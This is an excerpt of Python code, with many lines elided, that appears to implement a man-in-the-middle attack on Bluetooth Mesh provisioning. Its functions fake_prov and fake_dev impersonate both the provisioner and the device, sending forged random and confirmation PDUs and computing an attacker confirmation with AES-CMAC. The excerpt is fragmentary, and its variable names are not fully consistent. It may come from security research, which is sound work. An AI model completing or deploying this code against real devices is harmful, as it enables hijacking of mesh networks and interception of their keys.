...
def fake_prov(s_dev, s_prov, data):
    ...
    if data[0:1] == BEACON_TYPE:
        ...
        s_dev.send(PROVISIONING_RANDOM_OPCODE + attacker_random_todev)
        logger.info(f'Sent Attacker Random: {attacker_random_todev.hex()}')
        ...
        provisioning_salt = s1(confirmation_salt + attacker_random_todev + dev_random)
...
def fake_dev(s_dev, s_prov, data):
    if data == LINK_OPEN_OPCODE + DeviceUUID:
        ...
        global attacker_confirmation
        attacker_confirmation = get_random_bytes(len(data[1:]))
        attacker_confirmation_pdu = PROVISIONING_CONFIRMATION_OPCODE + attacker_confirmation
        s_prov.send(attacker_confirmation_pdu)
        logger.info(f'Sent Attacker Confirmation: {attacker_confirmation_pdu.hex()}')
        ...
        global attacker_random_todev
        attacker_random_todev = get_random_bytes(16)  # Generate random value
        ...
        attacker_confirmation = aes_cmac(dev_confirmation_key, attacker_random_todev + auth_value)
        ...
        provisioning_salt = s1(prov_confirmation_salt + prov_random + attacker_random)
